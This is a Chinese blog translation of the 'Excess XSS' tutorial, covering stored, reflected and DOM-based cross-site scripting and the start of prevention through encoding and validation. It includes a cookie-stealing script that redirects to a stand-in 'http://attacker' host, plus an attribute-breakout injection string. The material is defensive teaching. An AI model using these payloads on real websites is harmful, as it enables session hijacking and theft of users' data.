---
layout: post
title: 【Excess XSS译文】了解XSS攻击
description: "Just about everything you'll need to style in the theme: headings, paragraphs, blockquotes, tables, code blocks, and more."
modified: 2016-01-23
tags: [javascript, front-end, xss, safety]
image:
  feature: abstract-3.jpg
  credit: dargadgetz
  creditlink: http://www.dargadgetz.com/ios-7-abstract-wallpaper-pack-for-iphone-5-and-ipod-touch-retina/
comments: true
share: true
---

上一周被一个xss的问题困恼，通过阅读一篇关于xss的入门文章：[Excess XSS](http://excess-xss.com/)，让我重新捡起了xss的有关知识，觉得这篇文章很不错，通俗易懂、深入浅出，于是想翻译出来分享给大家。本篇译文分为两部分，首先是关于原文[Excess XSS](http://excess-xss.com/)的翻译。第二部分是关于我上周工作中遇到的一个有趣的XSS问题以及解决办法。

本文的原地址：http://excess-xss.com/

## 第一部分：概述

### 什么是XSS

跨站点脚本（Cross-site scripting，XSS）是一种脚本注入式攻击，允许攻击者在另一个用户的浏览器中执行恶意的脚本。

攻击者并不直接锁定某个受害者。而是利用一个受害者可能会访问的安全性薄弱的网站，通过这个网站替攻击者间接把恶意代码呈现给受害者。对于受害者的浏览器而言，这些恶意代码也是网站的合法的一部分，网站也就无意中成了攻击者的帮凶。

### 恶意代码是如何注入的

对于攻击者来说能够让受害者浏览器执行恶意代码的唯一方式，就是把代码注入受害者从网站上下载的页面中。如果网站直接把用户的输入作为页面呈现的一部分时，这是有可能发生的。因为攻击者可以以字符串的形式插入页面一段代码，这样就有可能在受害者的浏览器中被执行。

下面的例子是一个简单的服务端脚本，作用是展现网站上最新的评论:

```
print "<html>"
print "Latest comment:"
print database.latestComment
print "</html>"
```

这段脚本假设评论只包含文本。但是因为用户的输入是存入，一个攻击者可能提交这样的评论:`<script>...</script>`。任何访问这个页面的用户都会收到下面这样的内容：

```
<html>
Latest comment:
<script>...</script>
</html>
```

当用户的浏览器加载页面时，浏览器会执行包含在`<script>`标签中的任何脚本。这样以来攻击者就成功的完成了一次攻击。

### 什么是恶意脚本

首先，在受害者的浏览器中执行脚本算不上特别的恶意，毕竟在受限的环境中执行的脚本有非常有限的权限访问用户的文件和操作系统。事实上，你现在就可以打开你浏览器的脚本控制台立刻执行任何你想要的脚本，你几乎不可能对你的电脑造成任何的伤害。

但是，当你了解以下几个事实之后脚本变得恶意的可能性就变得越来越清晰了：

- Javascript有权访问一些用户的敏感信息，比如cookie
- Javascript能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址。
- Javascript能够通过DOM操作方法对当前页面的HTML做任意修改。

这些事实结合起来会引起非常严重的安全问题，也就是我们接下来要解释的。

### 恶意脚本的后果

这种在用户的浏览器中执行脚本的能力允许攻击者发动以下几类攻击

- Cookie窃取：攻击者能够通过`document.cookie`访问受害者与网站相关的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。
- 记录用户行为（Keylogging）：攻击者可以使用 `addEventListener`方法注册用于监听键盘敲击事件，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
- 钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的`action`属性执行他自己的服务器地址，然后欺骗用户提交他自己的敏感信息。

尽管这些攻击类型大不相同，但都有一条重要的相似之处：因为攻击者已经把代码注入进网站提供的页面，所以恶意脚本都是在网站的上下文中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待：它有权访问受害者与网站相关的数据（比如cookie），但此时浏览器地址栏的的主机名（hostname）仍然是原网站的。总而言之，恶意脚本被浏览器认为是网站合法的一部分，允许它做任何事情。

再一次被强调的关键问题是：

>如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了。

为了能够直奔重点，本篇教程中的一些例子都略去了恶意脚本的具体细节，只显示`<script>...</script>`。这表示这段代码是攻击者注入的代码，而不关心代码具体的执行内容

## 第二部分：XSS攻击

### XSS攻击中的各种角色

在我们具体描述XSS攻击时如何运作之前，我们需要定义一下XSS攻击涉及的角色。总的来说，XSS攻击涉及三类角色：**网站**、**受害者**、**攻击者**

- **网站**为发出请求的用户返回网页。在我们的例子中，网站的地址是`http://webiste/`
	- **网站数据库**用于存储显示在页面上的的用户输入的内容。
- **受害者**是一位从浏览器向网站请求页面的普通用户
- **攻击者**是一位打算利用网站XSS漏洞向受害者发动攻击的恶意用户
	- **攻击者服务器**是由攻击者控制服务器，专用于窃取受害者的敏感信息。在我们的例子中，它的地址是：`http://attacker`

### 一个攻击场景实例

在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：

```
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>
```

这段脚本将用户的浏览器定向到一个完全不同的URL，即触发向攻击者的服务器发送HTTP请求。这串URL把受害者的cookie作为查询参数，当攻击者服务器收到该请求后就能从中把cookie提取出来。一旦攻击者获取到cookie，他就能借助cookie扮演受害者并且发动更多的攻击。

从现在起，上面的HTML就被认为是**恶意文本**或者是**恶意脚本**。非常重要的值得注意的是，恶意代码只有在受害者的浏览器中最终得到解析之后才算得上是恶意，只可能发生网站有XSS缺陷的站点上。

#### 例子是如何工作的

下面的图示展现了攻击者发动的攻击是如何运作的

![]()

1. 攻击者利用网站表单将一段恶意文本插入网站的数据库中
2. 受害者向网站请求页面
3. 网站从数据库中取出了恶意文本把它包含进返回的页面中兵返回给受害者
4. 受害者的浏览器执行返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器。

### XSS类型

虽然XSS攻击的终极目标是在受害者的浏览器中执行恶意脚本，但是实现这个目标的不同途径还是有根本上的差别的。XSS攻击常常被划分为三类：

- 持续型XSS攻击：恶意文本来源于网站的数据库
- 反射型XSS攻击：恶意文本来源于受害者的请求
- 基于DOM的XSS攻击：弱点来自于客户端代码而不是服务端代码

前一个例子说明了一个持续型XSS攻击，我们接下来描述其他两类XSS攻击：反射型XSS和基于DOM的XSS。

#### 反射型XSS攻击

在一个反射型XSS攻击中，恶意文本是受害者发送给网站的请求中的一部分。网站在接下来给用户的返回中也包含了这部分恶意 代码。下面的图示阐述了这个场景

![]()

1. 攻击者构建一个包含恶意文本的URL发送给受害者
2. 受害者被攻击者欺骗通过这个URL向网站发送请求
3. 网站给受害者的返回中包含了来自URL的的恶意文本
4. 受害者的浏览器执行了来自返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器

##### 反射型XSS攻击是如何成功地？

一开始看来，反射型XSS攻击似乎是无害的，因为它要求受害者自己切实的发出一次带有恶意文本的请求。因为没有人愿意攻击他们自己，这样以来这样的攻击就没法实现了。

但结果是，至少存在两种方式使得一位受害者向他自己发动反射型XSS攻击：

- 如果攻击者的目标是一位具体的个人用户，攻击者能够把恶意的链接发送给受害者（比如通过电子邮件或者信息），并且欺骗他去访问这个链接。
- 如果攻击者的目标是一群用户，攻击者能够发布一条指向恶意URL的链接（比如在他的个人网站或者社交网络上），然后等待访问者去点击它。

#### 基于DOM的XSS攻击

基于DOM的XSS是属于持久型和反射型XSS的变种。在基于DOM的XSS的攻击中，除非网站的自身的合法脚本被执行，否则恶意文本不会被受害者的浏览器解析。下面的图示说明了基于反射型XSS攻击的这样一个场景

![]()

1. 攻击者构建一个包含恶意文本的URL发送受害者
2. 受害者被攻击者欺骗通过这个URL向网站发出请求
3. 网站收到请求，但是恶意文本并没有包含在给受害者的返回中
4. 受害者的浏览器执行来自网站返回里的合法脚本，导致恶意脚本被插入进页面中
5. 受害者的浏览器执行插入进页面的恶意脚本，把自己的cookie发送到攻击者的服务器

##### 什么使得基于DOM的XSS如此不同

在之前关于持久型和反射型的XSS攻击中，服务器将恶意脚本插入进页面中并返回给受害者。当受害者的浏览器收到返回后，它以为恶意脚本也是页面合法内容的一部分，并在页面加载时和其他脚本一同自动执行。

但是在这个基于DOM的XSS攻击示例中，没有恶意脚本被插入进页面中，在页面加载时自动执行的仅仅是页面的合法脚本。问题在于合法脚本直接把用户的输入作为HTML，新增于页面中。因为恶意文本使用`innerHTML`方法插入进页面中，它被解析为HTML，所以导致恶意脚本被执行。

不同之处虽然细微但是重要：

- 在传统的XSS攻击中，Javascript作为服务器传回的一部分，在页面加载时就被执行
- 在基于DOM的XSS攻击中，恶意脚本在页面加载之后的某个时间点才执行，作为合法脚本以非安全的方式处理用户输入的结果。

##### 为什么基于DOM的XSS攻击重要

在之前的例子中，Javscript是非必须的；服务器能够自己生成HTML。如果服务端代码没有漏洞，网站也就不会被XSS攻击。

但是随着网络应用变得越来越先进，HTML由客户端Javascript生成的情况也越来越多。任何时候想在不刷新页面的情况下改编页面内容，这样的更新操作必须由Javascript来完成。最值得注意的是，这就是当页面在发出一个AJAX请求后更新内容的情况。

这意味着XSS漏洞不仅存在于你的网站服务端代码中，还存在于网站客户端Javascript代码中。后果就是，即使你拥有完全安全的服务端代码，但存在把用户输入放入DOM更新中的情况，那么你的客户端代码仍然是不安全的。如果这样的情况发生了，那么表示客户端代码在没有服务端代码过错的情况下仍造成了一次XSS攻击。

#### 基于DOM的XSS攻击对服务端不可见

有一种基于DOM的XSS攻击的特殊情况是，恶意文本从一开始就不会被传送至服务端：当恶意文本包含在URL的片段标识符（#后之后的任意文本）中。浏览器不会将这部分的URL发送给服务端，所以网站也也无法从服务端代码中知晓。但无论如何，客户端代码有能力接触到它，如果处理不够安全的话会引起XSS漏洞。

这样的情况不限于片段标识符。其他的对服务端不可见的用户输入包括新的HTML5特性比如LocalStorage和IndexedDB都有这样的隐患。

## 第三部分：阻止XSS

### 阻止XSS攻击的方式

回想一下XSS攻击其实是一种代码注入：用户的输入被错误的解读为恶意的程序代码。为了防止这类代码注入，需要确保用户的输入是合法安全的。对一个web开发者来说，存在两种不同的确保用户安全输入的措施：

- **编码**，也就是转义用户的输入，这样浏览器就会把它解读为数据而不是代码
- **验证**，也就是对用户的输入进行过滤，这样浏览器仍然把它解读为代码但已经不存在恶意的命令了

虽然它们是阻止XSS攻击最基本的两类不同方式，但是在使用他们时有一些共同的特性需要着重理解：

- **上下文**：确保用户安全输入的措施会随着用户输入插入页码的位置而有所不同
- **入站/出站**：确保用户安全输入的措施既可以发生在网站接收到输入的时候（入站），也可以刚好发生在网站打算把输入插入到页面之前（出站）
- **客户端/服务端**：确保用户安全输入的措施既可以在客户端执行，也可以在服务端执行。在不同的场景下两者都能派上用场。

在我们继续解释编码和验证如何工作的细节之前，我们需要详细讲解一下这些要点。

#### 处理输入的上下文

页面中有许多可能插入用户输入的地方存在上下文。对于这样的每一处，都必须建立特殊的规则以确保用户输入不会破坏上下文并且不被解读为恶意代码。下面是一些最常见的上下文：

<table>
	<thead>
		<th>Context</th>
		<th>Example code</th>
	</thead>
	<tbody>
		<tr>
			<td>HTML element content</td>
			<td>&#60;div&#62;userInput&#60;&#47;div&#62;</td>
		</tr>
		<tr>
			<td>HTML attribute value</td>
			<td>&#60;input value="userInput"&#62;</td>
		</tr>	
		<tr>
			<td>URL query value</td>
			<td>http://example.com/?parameter=userInput</td>
		</tr>
		<tr>
			<td>CSS value</td>
			<td>color: userInput</td>
		</tr>
		<tr>
			<td>JavaScript value</td>
			<td>var name = "userInput";</td>
		</tr>								
	</tbody>
</table>

##### 为什么上下文重要

在所有描述的上下文中，XSS漏洞有可能在用户的输入在没有验证或者编码就插入页码的情况下差生。攻击者只要简单的在上下文中插入闭合分隔符并跟随恶意代码就能够注入恶意的脚本。

举个例子，如果在某种情况下网站会把用户输入直接插入进HTML元素的属性中，攻击者就会以双引号符号开头插入一段恶意脚本，向下面这样：

<table>
	<tr>
		<td>Application code</td>
		<td>&#60;input value="userInput"&#62;</td>
	</tr>
	<tr>
		<td>Malicious string</td>
		<td>"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</td>
	</tr>
	<tr>
		<td>Resulting code</td>
		<td>&#60;input value=""&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value=""&#62;</td>
	</tr>		
</table>

可以通过将用户输入中的所有双引号符号移除来防止这样的情况发生，然后就天下太平了——但这只是在当前的上下文中。如果同样的用户输入插入进另一个上下文中，闭合分隔符会变得不同，代码注入又会死灰复燃。出于这样的原因，确保用户安全输入的措施要依据用户输入插入的地方而有所区分。

#### 入站/出站的输入处理

我们本能的以为，当网站收到用户的输入时立即做编码或者验证就能够避免XSS攻击。通过这个方式，所有恶意文本在被包含进页面时就已经失效了，并且用于产生HTML的脚本再不用担心处理输入的安全性问题了。

但问题是，如之前描述的那样，用户输入可能被插入进页面的好几个上下文中。也没有容易的办法确定用户的输入最终插入的上下文是哪一个，并且同一个用户的输入需要被插入不同的上下文中。所以依赖入站式的输入处理方式来阻止XSS是一个可能会导致错误的不那么健壮的解决方案。（PHP中已经被移除的一个特性“[magic quotes](http://php.net/manual/en/security.magicquotes.php)”就是这个解决方案的一个里例子）



